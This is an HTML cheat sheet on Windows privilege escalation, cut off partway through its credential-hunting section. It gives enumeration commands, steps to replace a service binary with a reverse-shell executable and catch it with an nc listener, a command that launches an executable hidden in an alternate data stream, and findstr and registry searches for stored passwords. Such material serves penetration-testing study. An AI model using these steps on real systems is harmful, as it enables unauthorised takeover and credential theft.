<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windows Privilege Escalation - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Windows Privilege Escalation", url: "#_top", children: [
              {title: "Automation", url: "#automation" },
              {title: "LOLBAS (Living Off the Land Binaries, Scripts and Libraries)", url: "#lolbas-living-off-the-land-binaries-scripts-and-libraries" },
              {title: "OS Information", url: "#os-information" },
              {title: "Interesting Information", url: "#interesting-information" },
              {title: "Recent Files", url: "#recent-files" },
              {title: "Running Services", url: "#running-services" },
              {title: "Running Processes", url: "#running-processes" },
              {title: "Histories", url: "#histories" },
              {title: "VSS (Volume Shadow Copy Service)", url: "#vss-volume-shadow-copy-service" },
              {title: "Registry Keys", url: "#registry-keys" },
              {title: "Sensitive Information", url: "#sensitive-information" },
              {title: "Open Ports", url: "#open-ports" },
              {title: "Getting All Local Users/Groups", url: "#getting-all-local-usersgroups" },
              {title: "Change File Permission", url: "#change-file-permission" },
              {title: "Take Ownership of a File (Administrators Group Required)", url: "#take-ownership-of-a-file-administrators-group-required" },
              {title: "All Privs for Local Service, Network Service Account", url: "#all-privs-for-local-service-network-service-account" },
              {title: "Event Logs", url: "#event-logs" },
              {title: "Tasks", url: "#tasks" },
              {title: "Sysinternals", url: "#sysinternals" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
<p>Privilege Escalation (PrivEsc) in Windows is a process that get the Administrator credential and login.</p>
<div class="language-text highlight"><pre><span></span><code>- [windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [powershell-7.3](https://learn.microsoft.com/en-us/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.3)
</code></pre></div>
<h2 id="automation">Automation</h2>
<p>We might be able to find vulnerabilities on target Windows machine with automation tools as below:</p>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
<li><a href="https://github.com/bitsadmin/wesng">wesng (Windows Exploit Suggester Next Generation)</a></li>
<li><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a></li>
</ul>
<p><br /></p>
<h2 id="lolbas-living-off-the-land-binaries-scripts-and-libraries">LOLBAS (Living Off the Land Binaries, Scripts and Libraries)</h2>
<p><a href="https://lolbas-project.github.io/">LOLBAS</a> provides misuses tools and executables already in the Windows system.
So check the website.</p>
<p><br /></p>
<h2 id="os-information">OS Information</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">hostname</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">systeminfo</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;OS&quot;</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">ver</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="no">[System.Environment]</span><span class="p">::</span><span class="n">OSVersion</span><span class="p">.</span><span class="n">Version</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Datetime</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">Get-Date</span>
</span></code></pre></div>
<h2 id="interesting-information">Interesting Information</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Current user</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">whoami</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">user</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nb">echo </span><span class="k">%</span><span class="n">username</span><span class="p">%</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c"># List users</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="n">net</span> <span class="n">user</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">net</span> <span class="n">users</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">net</span> <span class="n">user</span> <span class="n">USERNAME</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="nb">Get-LocalUser</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c"># List groups</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="n">net</span> <span class="nb">group</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="n">net</span> <span class="n">localgroup</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="c"># List users in specific group</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="s2">&quot;Remote Management Users&quot;</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="c"># List user home directories</span>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span> <span class="n">-Force</span>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="c"># Network</span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="n">ipconfig</span>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="n">route</span> <span class="n">print</span>
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="n">arp</span> <span class="n">-A</span>
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="nb">Get-NetAdapter</span>
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="c"># Firewall</span>
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">state</span>
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">config</span>
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">show</span> <span class="n">allprofiles</span>
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="c"># PowerShell info</span>
</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="nb">Get-Host</span>
</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="nv">$Host</span>
</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="nv">$PSVersionTable</span>
</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="c"># Display only the PowerShell version.</span>
</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="p">(</span><span class="nb">Get-Host</span><span class="p">).</span><span class="n">Version</span>
</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="nv">$Host</span><span class="p">.</span><span class="n">Version</span>
</span></code></pre></div>
<h3 id="find-os-vulnerabilities">Find OS Vulnerabilities</h3>
<p>After investigating the OS information, find the vulnerabilities of OS version.</p>
<p><br /></p>
<h2 id="recent-files">Recent Files</h2>
<ol>
<li>Right-click on the Windows icon.</li>
<li>Click <strong>Run</strong>.</li>
<li>Type <code>recent</code>in the search form.</li>
</ol>
<p><br /></p>
<h2 id="running-services">Running Services</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Status</span> <span class="o">-eq</span> <span class="s2">&quot;Running&quot;</span><span class="p">}</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">list</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">list</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;Backup&quot;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c"># Get target process info</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">wmic</span> <span class="k">process</span> <span class="n">get</span> <span class="n">processid</span><span class="p">,</span><span class="n">parentprocessid</span><span class="p">,</span><span class="n">executablepath</span> <span class="p">|</span> <span class="n">find</span> <span class="s2">&quot;&lt;process-id&gt;&quot;</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c"># Get users SID</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="n">wmic</span> <span class="n">useraccount</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">sid</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c"># Launch the hidden executable hiding within ADS</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">wmic</span> <span class="k">process</span> <span class="n">call</span> <span class="n">create</span> <span class="p">$(</span><span class="nb">Resolve-Path</span> <span class="p">.\</span><span class="n">file</span><span class="p">.</span><span class="n">exe</span><span class="p">:</span><span class="n">streamname</span><span class="p">)</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="c"># Processes and services</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="nb">sc </span><span class="n">query</span> <span class="n">state</span><span class="p">=</span><span class="n">all</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="n">tasklist</span> <span class="p">/</span><span class="n">svc</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="nb">Get-Process</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="nb">ps</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="c"># Query the configuration info for a specified service</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&quot;example-service&quot;</span>
</span></code></pre></div>
<h3 id="override-service-executable">Override Service Executable</h3>
<p>At first, check the service status and get the executable for the service.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># 1. List running services and find interesting service</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>tasklist
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># or</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Get-Process
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># or</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>ps
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1"># 2. Check status the service</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>sc<span class="w"> </span>qc<span class="w"> </span><span class="s2">&quot;example-service&quot;</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># In the result, we can see the path of the executable which runs the service.</span>
</span></code></pre></div>
<p>Now check if we have write access under the folder where the executable exists.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;test&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="se">\p</span>ath<span class="se">\t</span>o<span class="se">\s</span>ervice-folder<span class="se">\t</span>est.txt
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>dir<span class="w"> </span><span class="se">\p</span>ath<span class="se">\t</span>o<span class="se">\s</span>ervice-folder
</span></code></pre></div>
<p>If we could write arbitrary file under the service folder, we may be able to replace the executable file as below:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>cp<span class="w"> </span>revshell.exe<span class="w"> </span><span class="se">\p</span>ath<span class="se">\t</span>o<span class="se">\s</span>ervice-folder<span class="se">\e</span>xample-service.exe
</span></code></pre></div>
<p>For example, if we want to do reverse shell, we need to prepare a net listener on our local machine:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
</span></code></pre></div>
<p>Now restart the service on target machine:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sc<span class="w"> </span>stop<span class="w"> </span><span class="s2">&quot;example-service&quot;</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>sc<span class="w"> </span>start<span class="w"> </span><span class="s2">&quot;example-service&quot;</span>
</span></code></pre></div>
<p>When the service restarts, our 'evil' executable is executed in stead of the original executable.<br />
After few seconds, we might be able to get the shell on local machine.</p>
<p><br /></p>
<h2 id="running-processes">Running Processes</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># -a: All connections and ports</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1"># -f: Display FQDN (Fully Qualified Domain Names)</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># -o: Display the owning process ID associated with each connection</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>netstat<span class="w"> </span>-afo
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># -n: Display address and port in numerical form (not resolve domain)</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>netstat<span class="w"> </span>-ano
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>tasklist
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>Get-Process
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>ps
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="c1"># Exclude `svchost`</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>Get-Process<span class="w"> </span><span class="p">|</span><span class="w"> </span>where<span class="w"> </span><span class="o">{</span><span class="nv">$_</span>.ProcessName<span class="w"> </span>-notlike<span class="w"> </span><span class="s2">&quot;svchost*&quot;</span><span class="o">}</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="c1"># Display only `LISTENING` processes</span>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>netstat<span class="w"> </span>-afo<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select-String<span class="w"> </span>-Pattern<span class="w"> </span><span class="s2">&quot;LISTENING&quot;</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="histories">Histories</h2>
<h3 id="command-history-in-powershell-console">Command History in PowerShell Console</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">type </span><span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">username</span><span class="p">&gt;\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div>
<h3 id="web-browser-hidsotries">Web Browser Hidsotries</h3>
<p>We might be able to find interesting information about users by checking histories of web browsers such as <strong>Chrome</strong>, <strong>Microsoft Edge</strong>, <strong>Internet Explorer</strong>, etc.</p>
<p><br /></p>
<h2 id="vss-volume-shadow-copy-service">VSS (Volume Shadow Copy Service)</h2>
<p>VSS coordinates the actions that  are required to create a consistent a shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">vssadmin</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">vssadmin</span> <span class="n">list</span> <span class="n">shadows</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">vssadmin</span> <span class="n">list</span> <span class="n">volumes</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="registry-keys">Registry Keys</h2>
<p>We may be able to retrieve sensitive information in registry hives.<br />
See also: 
<a href="/exploit/windows/privilege-escalation/windows-privesc-with-registry-keys/">Windows PrivEsc with Registry Keys</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># List all subkeys of a registry key</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Get-ChildItem<span class="w"> </span>-Path<span class="w"> </span>HKCU:<span class="se">\ </span><span class="p">|</span><span class="w"> </span>Select-Object<span class="w"> </span>Name
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># -Recurse: List recursively</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Get-ChildItem<span class="w"> </span>-Path<span class="w"> </span>HKCU:<span class="se">\S</span>ystem<span class="w"> </span>-Recurse<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select-Object<span class="w"> </span>Name
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># Search sensitive information in HKLM (HKEY_LOCAL_MACHINE)</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="c1"># /f password: Specifies the keyword &#39;password&#39; to search.</span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># /t REG_SZ: Specifies REG_SZ (string) type to search.</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c1"># /s: Specifies to query all subkeys and value names recursively.</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
</span></code></pre></div>
<p><br /></p>
<h2 id="sensitive-information">Sensitive Information</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># /s: Searches the current directory and all subdirectories.</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c"># /i: Ignores the case of the characters.</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">xml</span> <span class="p">*.</span><span class="n">ini</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\*.</span><span class="n">txt</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">cred</span> <span class="p">*.</span><span class="n">txt</span> <span class="p">*.</span><span class="n">xml</span> <span class="p">*.</span><span class="n">ini</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">cred</span> <span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\*.</span><span class="n">txt</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="c"># /p: Skips files with non-printable characters.</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="c"># /n: Prints the line number of each line that matches.</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">spin</span> <span class="s2">&quot;password&quot;</span> <span class="p">*.*</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">spin</span> <span class="s2">&quot;password&quot;</span> <span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\*</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="c"># List files</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="c"># /a: Displays only the names of those directories and files.</span>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="c"># /s: Lists every oncurrece of the specified file name within the specified directory and all subdirectories.</span>
